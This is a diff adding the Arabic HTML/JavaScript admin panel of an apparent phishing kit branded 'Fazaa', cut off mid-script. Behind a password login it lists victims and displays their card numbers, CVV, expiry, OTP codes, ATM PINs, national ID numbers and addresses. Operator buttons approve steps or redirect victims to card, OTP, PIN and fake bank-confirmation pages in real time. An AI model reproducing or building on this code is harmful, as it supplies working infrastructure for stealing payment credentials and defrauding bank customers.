@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة التحكم - Fazaa</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
+  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);color:#fff}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}
+
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.login-box{background:rgba(30,41,59,.8);border:1px solid rgba(51,65,85,.5);border-radius:24px;
+  padding:48px 40px;width:100%;max-width:420px;box-shadow:0 25px 60px rgba(0,0,0,.4);text-align:center;backdrop-filter:blur(10px)}
+.login-box h1{font-size:24px;font-weight:800;margin:16px 0 6px}
+.login-box .sub{color:rgba(255,255,255,.5);font-size:13px;margin-bottom:32px}
+.login-box input{width:100%;padding:14px 18px;border:1.5px solid rgba(51,65,85,.5);border-radius:12px;
+  font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;background:#0f172a;color:#fff;transition:.2s}
+.login-box input:focus{border-color:#1B7A3D}
+.login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#1B7A3D,#16a34a);color:#fff;border:none;
+  border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
+.login-err{color:#f87171;font-size:12px;margin-bottom:10px;display:none}
+
+.layout{display:none;flex-direction:column;height:100vh;overflow:hidden}
+
+.topbar{background:rgba(15,23,42,.95);backdrop-filter:blur(10px);padding:12px 24px;
+  display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(27,122,61,.3)}
+.tb-r{display:flex;align-items:center;gap:12px}
+.tb-r .ico{width:36px;height:36px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:10px;
+  display:flex;align-items:center;justify-content:center;font-size:18px}
+.tb-r .t{color:#1B7A3D;font-weight:800;font-size:16px}
+.tb-r .sp{color:rgba(255,255,255,.4);font-size:13px}
+.tb-r .bn{color:rgba(255,255,255,.5);font-size:13px}
+.tb-l{display:flex;align-items:center;gap:12px}
+.tb-visitors{display:inline-flex;align-items:center;gap:8px;background:rgba(245,158,11,.18);
+  border:1px solid rgba(245,158,11,.45);color:#fbbf24;border-radius:999px;padding:6px 14px;
+  font-size:13px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;transition:.2s}
+.tb-visitors:hover{background:rgba(245,158,11,.28)}
+.tb-visitors .num{background:rgba(245,158,11,.35);padding:2px 8px;border-radius:10px;color:#fff;font-weight:800;min-width:24px;text-align:center}
+.tb-online{display:inline-flex;align-items:center;gap:6px;color:#86efac;background:rgba(34,197,94,.12);
+  border:1px solid rgba(34,197,94,.3);border-radius:999px;padding:6px 10px;font-size:12px;font-weight:700}
+.tb-online .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 7px #22c55e}
+.tb-admin{color:rgba(255,255,255,.6);font-size:13px}
+.tb-logout{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171;
+  border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;font-weight:700}
+
+.stats{padding:16px 24px;display:grid;grid-template-columns:repeat(5,1fr);gap:16px;
+  border-bottom:1px solid rgba(255,255,255,.06);flex-shrink:0}
+.sc{border-radius:14px;padding:14px 16px;text-align:center;transition:.15s;cursor:default}
+.sc:hover{transform:translateY(-2px)}
+.sc-v{font-size:24px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:6px}
+.sc-v .live{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 1.5s infinite}
+.sc-lb{font-size:12px;color:rgba(255,255,255,.5);margin-top:4px}
+.sc-hint{font-size:10px;margin-top:2px;font-weight:700}
+
+.body{display:flex;height:calc(100vh - 160px)}
+
+.col-a{width:280px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0;background:rgba(59,130,246,.03)}
+.col-a-head{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(59,130,246,.08);
+  position:sticky;top:0;z-index:1;display:flex;align-items:center;gap:8px;font-weight:800;font-size:13px;color:#3b82f6}
+.col-a-head .gd{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e;animation:pulse 1.5s infinite}
+.ac{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s}
+.ac:hover{background:rgba(59,130,246,.08)}
+.ac.sel{background:rgba(59,130,246,.15)}
+.ac-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
+.ac-n{font-weight:700;font-size:12px}
+.pg-badge{color:#fff;border-radius:8px;padding:1px 6px;font-size:9px;font-weight:700;display:inline-block}
+.ac-info{display:flex;gap:8px;font-size:10px;color:rgba(255,255,255,.5)}
+.ac-info .otp{color:#fbbf24;font-weight:700}
+.al-empty{padding:30px 20px;text-align:center;color:rgba(255,255,255,.3)}
+.al-empty .ic{font-size:32px;margin-bottom:6px}
+.al-empty p{font-size:12px}
+
+.col-o{width:320px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0}
+.col-o-head{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(27,122,61,.06);position:sticky;top:0;z-index:1}
+.col-o-head .t{font-weight:800;font-size:13px;color:#1B7A3D;margin-bottom:8px}
+.col-o-head input{width:100%;padding:8px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
+  border-radius:8px;color:#fff;font-size:12px;font-family:'Cairo',sans-serif;outline:none;box-sizing:border-box}
+.oc{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s;position:relative}
+.oc:hover{background:rgba(27,122,61,.06)}
+.oc.sel{background:rgba(27,122,61,.15)}
+.oc-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+.oc-nm{display:flex;align-items:center;gap:6px}
+.oc-nm span{font-weight:700;font-size:12px}
+.oc-info{color:rgba(255,255,255,.4);font-size:10px}
+.oc-otp{display:inline-block;margin-top:4px;background:rgba(245,158,11,.15);border-radius:4px;
+  padding:1px 6px;font-size:10px;color:#fbbf24;font-weight:700}
+.oc-del{position:absolute;top:6px;left:6px;border-radius:5px;padding:2px 6px;font-size:10px;
+  cursor:pointer;font-family:'Cairo',sans-serif;font-weight:700;transition:.15s}
+.oc-del.normal{background:rgba(220,38,38,.1);border:1px solid rgba(220,38,38,.2);color:#f87171}
+.oc-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}
+.ol-empty{padding:40px 20px;text-align:center;color:rgba(255,255,255,.3)}
+.ol-empty .ic{font-size:40px;margin-bottom:10px}
+.ol-empty p{font-size:13px}
+
+.col-d{flex:1;overflow-y:auto;padding:20px 24px}
+.d-empty{display:flex;align-items:center;justify-content:center;height:100%;color:rgba(255,255,255,.3);
+  flex-direction:column;gap:12px}
+.d-empty .ic{font-size:56px}
+
+.dh{background:rgba(255,255,255,.04);border-radius:14px;padding:16px 20px;margin-bottom:16px;
+  border:1px solid rgba(255,255,255,.08);display:flex;align-items:center;justify-content:space-between}
+.dh-left{display:flex;align-items:center;gap:14px}
+.dh-av{width:44px;height:44px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:12px;
+  display:flex;align-items:center;justify-content:center;font-size:20px}
+.dh-name{font-weight:800;font-size:18px}
+.dh-meta{display:flex;align-items:center;gap:8px;margin-top:4px;flex-wrap:wrap}
+.dh-time{color:rgba(255,255,255,.4);font-size:11px}
+.dh-del{border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
+.dh-del.normal{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171}
+.dh-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}
+
+.sec-codes{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(245,158,11,.03));
+  border:1px solid rgba(245,158,11,.3);border-radius:14px;padding:16px;margin-bottom:16px}
+.sec-codes h3{font-weight:800;font-size:14px;color:#f59e0b;margin:0 0 12px}
+.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+.code-card{background:rgba(0,0,0,.3);border-radius:10px;padding:12px;border:1px solid rgba(245,158,11,.2);text-align:center}
+.code-card .lbl{font-size:10px;color:rgba(255,255,255,.5);margin-bottom:4px}
+.code-card .val{font-weight:800;font-size:18px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all}
+.code-card .cp{margin-top:6px;background:rgba(255,255,255,.08);border:none;border-radius:6px;padding:3px 8px;
+  color:#fff;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
+.code-card .cp.ok{color:#4ade80}
+.code-empty{background:rgba(0,0,0,.15);border-radius:10px;padding:12px;border:1px dashed rgba(255,255,255,.08);text-align:center}
+.code-empty .lbl{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:4px}
+.code-empty .val{color:rgba(255,255,255,.3);font-size:12px}
+
+.sec-data{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
+.sec-data h3{font-weight:800;font-size:14px;color:#1B7A3D;margin:0 0 12px}
+.data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.data-item{background:rgba(255,255,255,.04);border-radius:10px;padding:12px;position:relative}
+.data-item.hl{border:1px solid rgba(245,158,11,.2)}
+.data-item:not(.hl){border:1px solid rgba(255,255,255,.06)}
+.data-item .lbl{color:rgba(255,255,255,.4);font-size:10px;margin-bottom:4px;display:flex;align-items:center;gap:4px}
+.data-item .val{font-weight:700;font-size:13px;word-break:break-all}
+.data-item .val.hl{color:#fbbf24}
+.data-item .cp{margin-top:6px;background:rgba(255,255,255,.06);border:none;border-radius:5px;padding:2px 8px;
+  color:rgba(255,255,255,.5);font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
+.data-item .cp.ok{color:#4ade80}
+
+.sec-ctrl{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
+.sec-ctrl h4{font-weight:700;font-size:14px;margin:0 0 12px}
+.approve-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.approve-row button{border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
+.btn-ok{background:#16a34a;color:#fff}
+.btn-no{background:#dc2626;color:#fff}
+.btn-ok.disabled,.btn-no.disabled{background:#9ca3af;cursor:not-allowed;opacity:.6}
+.redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:8px}
+.redir-grid button{border:none;border-radius:8px;padding:8px 6px;font-size:11px;font-weight:700;
+  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
+.redir-grid button:hover{opacity:.85}
+
+.sec-del{background:rgba(220,38,38,.05);border-radius:14px;padding:16px;border:1px solid rgba(220,38,38,.2);margin-bottom:16px}
+.sec-del h4{font-weight:700;font-size:14px;color:#f87171;margin:0 0 10px;display:flex;align-items:center;gap:8px}
+.sec-del .del-msg{padding:8px 10px;border-radius:8px;margin-bottom:10px;font-size:12px;font-weight:700;text-align:center}
+.sec-del .del-msg.ok{background:rgba(22,163,74,.2);color:#4ade80;border:1px solid rgba(22,163,74,.4)}
+.sec-del .del-msg.err{background:rgba(220,38,38,.2);color:#ef4444;border:1px solid rgba(220,38,38,.4)}
+.btn-del-all{width:100%;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;border:1px solid rgba(220,38,38,.4);
+  border-radius:8px;padding:10px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
+  box-shadow:0 4px 12px rgba(220,38,38,.2)}
+.del-confirm-row{display:flex;gap:8px}
+.del-confirm-row button{flex:1;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
+  cursor:pointer;font-family:'Cairo',sans-serif}
+.del-warn{color:#fbbf24;font-size:12px;font-weight:700;margin-bottom:10px;text-align:center}
+.sec-del .note{color:rgba(255,255,255,.4);font-size:11px;margin-top:8px}
+
+.modal-bg{display:none;position:fixed;inset:0;background:rgba(10,15,29,.82);backdrop-filter:blur(10px);
+  z-index:9999;align-items:center;justify-content:center;padding:20px}
+.modal-bg.show{display:flex}
+.modal{background:#0f172a;border:1px solid rgba(245,158,11,.35);border-radius:20px;
+  width:100%;max-width:860px;max-height:90vh;display:flex;flex-direction:column;
+  box-shadow:0 25px 65px rgba(0,0,0,.65);overflow:hidden}
+.modal-head{padding:18px 24px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;
+  align-items:center;justify-content:space-between;background:rgba(245,158,11,.05)}
+.modal-head h3{font-size:17px;font-weight:800;color:#f59e0b}
+.modal-head p{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
+.modal-head .btns{display:flex;gap:8px}
+.modal-head .btns button{border-radius:8px;padding:6px 12px;font-size:12px;font-weight:700;
+  cursor:pointer;font-family:'Cairo',sans-serif}
+.modal-body{padding:20px 24px;overflow-y:auto;flex:1}
+.vm-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px}
+.vm-sc{border-radius:14px;padding:14px;text-align:center}
+.vm-sc .n{font-size:26px;font-weight:800}
+.vm-sc .l{font-size:12px;color:rgba(255,255,255,.6);margin-top:4px}
+.vm-footer{margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.08);
+  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
+.vm-footer .note{font-size:11px;color:rgba(255,255,255,.4)}
+
+.notif{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#1B7A3D;color:#fff;
+  padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:10000;
+  box-shadow:0 8px 24px rgba(0,0,0,.3);display:none;animation:slideD .3s ease}
+@keyframes slideD{from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+@media(max-width:1100px){.col-a{width:240px}.col-o{width:280px}}
+@media(max-width:800px){
+  .body{flex-direction:column;overflow-y:auto}
+  .col-a,.col-o{width:100%;max-height:220px;overflow-y:auto}
+  .col-d{min-height:500px}
+  .stats{grid-template-columns:repeat(3,1fr)}
+  .codes-grid{grid-template-columns:repeat(2,1fr)!important}
+}
+</style>
+</head>
+<body>
+
+<div class="notif" id="notif"></div>
+<div class="modal-bg" id="vModal"></div>
+
+<div class="login-wrap" id="loginScreen">
+  <div class="login-box">
+    <div style="font-size:48px">🏦</div>
+    <h1>لوحة التحكم</h1>
+    <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
+    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
+    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
+    <button onclick="doLogin()">دخول</button>
+  </div>
+</div>
+
+<div class="layout" id="layout">
+  <div class="topbar">
+    <div class="tb-r">
+      <div class="ico">🏦</div>
+      <span class="t">لوحة التحكم</span>
+      <span class="sp">|</span>
+      <span class="bn">Fazaa</span>
+    </div>
+    <div class="tb-l">
+      <button class="tb-visitors" onclick="openVM()">
+        <span>📊</span><span>الطلبات:</span><span class="num" id="tbV">0</span>
+      </button>
+      <span class="tb-online"><span class="dot"></span> الزوار: <strong id="tbO">0</strong></span>
+      <span class="tb-admin">👤 Admin</span>
+      <button class="tb-logout" onclick="doLogout()">خروج</button>
+    </div>
+  </div>
+
+  <div class="stats" id="statsRow"></div>
+
+  <div class="body">
+    <div class="col-a">
+      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
+      <div id="aList"></div>
+    </div>
+    <div class="col-o">
+      <div class="col-o-head">
+        <div class="t">📋 جميع الطلبات (<span id="oCnt">0</span>)</div>
+        <input type="text" id="sInp" placeholder="🔍 بحث بالاسم أو الهاتف أو المرجع..." oninput="filterOrders()">
+      </div>
+      <div id="oList"></div>
+    </div>
+    <div class="col-d" id="colD">
+      <div class="d-empty" id="dEmpty"><div class="ic">👈</div><p>اختر طلباً لعرض تفاصيله</p></div>
+      <div id="dCont" style="display:none"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+var PL={pending:'قيد الانتظار',awaiting:'بانتظار الموافقة',stepok:'تم القبول',
+  confirmed:'مكتمل',rejected:'مرفوض',redirect:'إعادة توجيه'};
+function statusLabel(o){
+  if(o.status==='confirmed') return 'مكتمل';
+  if(o.status==='rejected') return 'مرفوض';
+  if(o.status==='redirect') return 'إعادة توجيه';
+  if(o.step==='pin') return 'ATM قيد الانتظار';
+  if(o.step==='otp') return 'OTP قيد الانتظار';
+  if(o.step==='card') return 'بطاقة قيد الانتظار';
+  return 'بيانات جديدة';
+}
+var PC={pending:'#f59e0b',awaiting:'#7c3aed',stepok:'#3b82f6',confirmed:'#16a34a',rejected:'#dc2626',redirect:'#0ea5e9'};
+var STEPS={card:'بطاقة الدفع',otp:'رمز التحقق',pin:'الرقم السري'};
+var STEPC={card:'#0ea5e9',otp:'#f59e0b',pin:'#a855f7'};
+
+var PW=sessionStorage.getItem('admin_pw')||'',orders=[],onlineCount=0,totalVisitors=0,visitorPages=[],
+    selRef=null,sQ='',prevRefs=new Set(),delConfRef=null,detDelConf=false;
+
+function api(method,url,body){
+  var hdrs={"x-admin-password":PW};
+  if(body)hdrs["Content-Type"]="application/json";
+  var opts={method:method,headers:hdrs};
+  if(body)opts.body=JSON.stringify(body);
+  return fetch(url,opts).then(function(r){
+    if(r.status===401&&url.indexOf('/admin/check')===-1){
+      PW='';sessionStorage.removeItem('admin_pw');
+      document.getElementById('layout').style.display='none';
+      document.getElementById('loginScreen').style.display='flex';}
+    return r.json();
+  });
+}
+
+function doLogin(){
+  var pw=document.getElementById('passInput').value;
+  fetch('/api/admin/check',{headers:{"x-admin-password":pw}}).then(function(r){return r.json();}).then(function(d){
+    if(d.ok){PW=pw;sessionStorage.setItem('admin_pw',pw);showDash();}
+    else document.getElementById('loginErr').style.display='block';
+  }).catch(function(){document.getElementById('loginErr').style.display='block';});
+}
+function doLogout(){PW='';sessionStorage.removeItem('admin_pw');
+  document.getElementById('layout').style.display='none';document.getElementById('loginScreen').style.display='flex';}
+document.getElementById('passInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+
+function checkAuth(){
+  if(!PW)return;
+  fetch('/api/admin/check',{headers:{"x-admin-password":PW}}).then(function(r){return r.json();}).then(function(d){
+    if(d.ok)showDash();else{PW='';sessionStorage.removeItem('admin_pw');}
+  }).catch(function(){});
+}
+function showDash(){document.getElementById('loginScreen').style.display='none';
+  document.getElementById('layout').style.display='flex';loadVisitors();loadOrders();}
+
+function playSound(){try{var c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();
+  o.connect(g);g.connect(c.destination);g.gain.setValueAtTime(.3,c.currentTime);o.type='sine';
+  o.frequency.setValueAtTime(800,c.currentTime);o.frequency.setValueAtTime(1200,c.currentTime+.1);
+  g.gain.exponentialRampToValueAtTime(.01,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4);}catch(e){}}
+function showNotif(m){var el=document.getElementById('notif');el.textContent=m;el.style.display='block';
+  setTimeout(function(){el.style.display='none';},4000);}
+
+function esc(s){return s?String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'):''}
+function fmtDate(ts){if(!ts)return'—';try{var d=new Date(typeof ts==='number'?ts:ts);
+  return d.toLocaleDateString('ar-EG',{year:'numeric',month:'2-digit',day:'2-digit'})+' '+
+  d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',hour12:true});}catch(e){return'—';}}
+
+function statusBadge(o){var st=typeof o==='string'?o:o.status;
+  var l=typeof o==='string'?(PL[o]||o||'—'):statusLabel(o);
+  var c=PC[st]||'#6b7280';
+  return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';}
+function stepBadge(step){if(!step)return'';var l=STEPS[step]||step,c=STEPC[step]||'#6b7280';
+  return '<span class="pg-badge" style="background:'+c+'">'+l+'</span>';}
+
+function isActive(o){
+  if(o.status!=='pending'&&o.status!=='awaiting'&&o.status!=='stepok') return false;
+  var last=o.updated||o.ts;
+  if(!last) return true;
+  return (Date.now()-last)<600000;
+}
+
+function renderStats(){
+  var active=orders.filter(isActive),done=orders.filter(function(o){return o.status==='confirmed';});
+  var cards=[
+    {label:'إجمالي الطلبات',value:orders.length,color:'#1B7A3D',bg:'rgba(27,122,61,0.1)',border:'rgba(27,122,61,0.25)',icon:'👥',fn:'scrollToOrders()',hint:'عرض الطلبات ↗'},
+    {label:'إجمالي الزوار',value:totalVisitors,color:'#f59e0b',bg:'rgba(245,158,11,0.1)',border:'rgba(245,158,11,0.25)',icon:'📊',fn:'openVM()',hint:'عرض التفاصيل ↗'},
+    {label:'الزوار الحاليين',value:onlineCount,color:'#22c55e',bg:'rgba(34,197,94,0.1)',border:'rgba(34,197,94,0.25)',icon:'🌐',live:true,fn:'openVM()',hint:'المتصلين الآن ↗'},
+    {label:'طلبات نشطة',value:active.length,color:'#3b82f6',bg:'rgba(59,130,246,0.1)',border:'rgba(59,130,246,0.25)',icon:'⚡',live:true,fn:'scrollToActive()',hint:'عرض النشطة ↗'},
+    {label:'مكتملة',value:done.length,color:'#16a34a',bg:'rgba(22,163,74,0.1)',border:'rgba(22,163,74,0.25)',icon:'✅',fn:'scrollToDone()',hint:'عرض المكتملة ↗'}
+  ];
+  document.getElementById('statsRow').innerHTML=cards.map(function(c){
+    var cl=c.fn?'cursor:pointer':'cursor:default';
+    var onclick=c.fn?' onclick="'+c.fn+'"':'';
+    var live=c.live&&c.value>0?'<span class="live" style="background:'+c.color+'"></span>':'';
+    var hint=c.hint?'<div class="sc-hint" style="color:'+c.color+'">'+c.hint+'</div>':'';
+    return '<div class="sc" style="background:'+c.bg+';border:1px solid '+c.border+';'+cl+'"'+onclick+'>'+
+      '<div class="sc-v">'+live+c.icon+' '+c.value+'</div>'+
+      '<div class="sc-lb">'+c.label+'</div>'+hint+'</div>';
+  }).join('');
+  document.getElementById('tbV').textContent=orders.length;
+  document.getElementById('tbO').textContent=onlineCount;
+  document.getElementById('aCnt').textContent=active.length;
+  document.getElementById('oCnt').textContent=orders.length;
+}
+
+function renderActive(){
+  var el=document.getElementById('aList'),list=orders.filter(isActive);
+  if(!list.length){el.innerHTML='<div class="al-empty"><div class="ic">💤</div><p>لا يوجد عملاء نشطين</p></div>';return;}
+  el.innerHTML=list.map(function(o){
+    var badge=o.step?stepBadge(o.step):statusBadge(o);
+    var pay=o.pay||{};
+    var otp=pay.otp?'<span class="otp">OTP: '+esc(pay.otp)+'</span>':'';
+    return '<div class="ac'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
+      '<div class="ac-t"><span class="ac-n">'+(esc(o.n)||esc(o.p)||'—')+'</span>'+badge+'</div>'+
+      '<div class="ac-info">'+(o.p?'<span>📱 '+esc(o.p)+'</span>':'')+otp+'</div></div>';
+  }).join('');
+}
+
+function renderOrders(){
+  var el=document.getElementById('oList');
+  var list=orders;
+  if(sQ){var q=sQ.toLowerCase();list=orders.filter(function(o){
+    return(o.n||'').toLowerCase().indexOf(q)!==-1||(o.p||'').indexOf(q)!==-1||(o.ref||'').toLowerCase().indexOf(q)!==-1;});}
+  if(!list.length){el.innerHTML='<div class="ol-empty"><div class="ic">📭</div><p>لا توجد طلبات</p></div>';return;}
+  el.innerHTML=list.map(function(o){
+    var isDC=delConfRef===o.ref;
+    var pay=o.pay||{};
+    var stepInfo=o.step?'<div class="oc-otp">📲 '+(STEPS[o.step]||o.step)+(pay.otp?' • OTP: '+esc(pay.otp):'')+'</div>':'';
+    return '<div class="oc'+(o.ref===selRef?' sel':'')+'" onclick="selectOrder(\''+esc(o.ref)+'\')">'+
+      '<div class="oc-t"><div class="oc-nm"><span>'+(esc(o.n)||esc(o.p)||'—')+'</span></div>'+statusBadge(o)+'</div>'+
+      '<div class="oc-info">📱 '+(esc(o.p)||'—')+' • 🕐 '+fmtDate(o.ts)+' • '+esc(o.ref)+'</div>'+
+      stepInfo+
+      '<button class="oc-del '+(isDC?'confirm':'normal')+'" onclick="event.stopPropagation();oDel(\''+esc(o.ref)+'\')">'+(isDC?'⚠️ تأكيد':'✕')+'</button></div>';
+  }).join('');
+}
+
+function filterOrders(){sQ=document.getElementById('sInp').value.trim();renderOrders();}
+
+function oDel(ref){
+  if(delConfRef===ref){api('DELETE','/api/admin/orders/'+encodeURIComponent(ref)).then(function(){
+    delConfRef=null;if(selRef===ref)closeDetail();loadOrders();});}
+  else{delConfRef=ref;renderOrders();setTimeout(function(){if(delConfRef===ref){delConfRef=null;renderOrders();}},3000);}
+}
+
+function selectOrder(ref){selRef=ref;delConfRef=null;detDelConf=false;
+  var o=orders.find(function(x){return x.ref===ref;});if(o)renderDetail(o);renderActive();renderOrders();}
+function closeDetail(){selRef=null;document.getElementById('dEmpty').style.display='flex';
+  document.getElementById('dCont').style.display='none';renderActive();renderOrders();}
+
+function renderDetail(o){
+  document.getElementById('dEmpty').style.display='none';
+  var dc=document.getElementById('dCont');dc.style.display='block';
+  var pay=o.pay||{};
+  var h='';
+
+  h+='<div class="dh"><div class="dh-left"><div class="dh-av">👤</div><div>'+
+    '<div class="dh-name">'+(esc(o.n)||esc(o.p)||'—')+'</div>'+
+    '<div class="dh-meta">'+statusBadge(o)+' '+(o.step?stepBadge(o.step):'')+
+    '<span class="dh-time">🕐 '+fmtDate(o.ts)+'</span></div></div></div>'+
+    '<button class="dh-del '+(detDelConf?'confirm':'normal')+'" onclick="detDel(\''+esc(o.ref)+'\')">'+(detDelConf?'⚠️ تأكيد':'🗑️ حذف')+'</button></div>';
+
+  h+='<div class="sec-codes"><h3>🔑 البيانات السرية</h3><div class="codes-grid">';
+  h+=codeCard('👤 اسم حامل البطاقة',pay.cardName);
+  h+=codeCard('💳 رقم البطاقة',pay.cardNumber);
+  h+=codeCard('📅 تاريخ الانتهاء',pay.exp);
+  h+=codeCard('🔒 CVV',pay.cvv);
+  h+=codeCard('📲 الكود OTP',pay.otp);
+  h+=codeCard('🏧 رقم ATM',pay.pin);
+  h+='</div></div>';
+
+  var allData=[
+    {icon:'🔖',label:'رقم المرجع',value:o.ref,hl:true},
+    {icon:'🕐',label:'التاريخ',value:fmtDate(o.ts)},
+    {icon:'📱',label:'الهاتف',value:o.p},
+    {icon:'👤',label:'الاسم',value:o.n},
+    {icon:'🆔',label:'رقم الهوية',value:o.id},
+    {icon:'📧',label:'البريد',value:o.e},
+    {icon:'👫',label:'الجنس',value:o.g==='male'?'ذكر':o.g==='female'?'أنثى':''},
+    {icon:'🏙️',label:'الإمارة',value:o.em},
+    {icon:'📅',label:'العمر',value:o.a},
+    {icon:'📍',label:'العنوان',value:o.ad},
+    {icon:'💳',label:'نوع البطاقة',value:o.card},
+    {icon:'🏛️',label:'النوع',value:o.st==='resident'?'مقيم':o.st==='citizen'?'مواطن':''},
+    {icon:'📊',label:'الحالة',value:statusLabel(o)},
+    {icon:'👤',label:'اسم حامل البطاقة',value:pay.cardName},
+    {icon:'💳',label:'رقم البطاقة',value:pay.cardNumber,hl:true},
+    {icon:'📅',label:'تاريخ الانتهاء',value:pay.exp},
+    {icon:'🏦',label:'نوع البطاقة',value:pay.brand}
+  ].filter(function(d){return d.value&&d.value!=='—';});
+
+  h+='<div class="sec-data"><h3>📋 جميع البيانات</h3><div class="data-grid">';
+  allData.forEach(function(d){
+    var hlc=d.hl?' hl':'';
+    h+='<div class="data-item'+hlc+'"><div class="lbl">'+d.icon+' '+d.label+'</div>'+
+      '<div class="val'+hlc+'">'+esc(d.value)+'</div>'+
+      '<button class="cp" data-copy="'+esc(d.value)+'" onclick="doCopy(this)">نسخ</button></div>';
+  });
+  h+='</div></div>';
+
+  h+='<div class="sec-ctrl"><h4>🎮 التحكم في رحلة العميل</h4>';
+  var canApprove=o.status==='pending'||o.status==='awaiting';
+  if(canApprove){
+    h+='<div class="approve-row">'+
+      '<button class="btn-ok" onclick="doDecide(\''+esc(o.ref)+'\',\'accept\')">✅ موافقة</button>'+
+      '<button class="btn-no" onclick="doDecide(\''+esc(o.ref)+'\',\'reject\')">❌ رفض</button></div>';
+  }else{
+    h+='<div class="approve-row">'+
+      '<button class="btn-ok disabled" disabled>✅ موافقة</button>'+
+      '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
+  }
+  var redirPages=[
+    {l:'🏠 الرئيسية',pg:'home',c:'#6b7280'},
+    {l:'💳 البطاقة',pg:'card',c:'#0ea5e9'},
+    {l:'📲 الكود',pg:'otp',c:'#f59e0b'},
+    {l:'🏧 ATM',pg:'pin',c:'#a855f7'},
+    {l:'⏳ الانتظار',pg:'wait',c:'#7c3aed'},
+    {l:'✅ النجاح',pg:'done',c:'#16a34a'},
+    {l:'🏦 تأكيد البنك',pg:'bankconfirm',c:'#0369a1'}
+  ];
+  h+='<div class="redir-grid">'+redirPages.map(function(p){
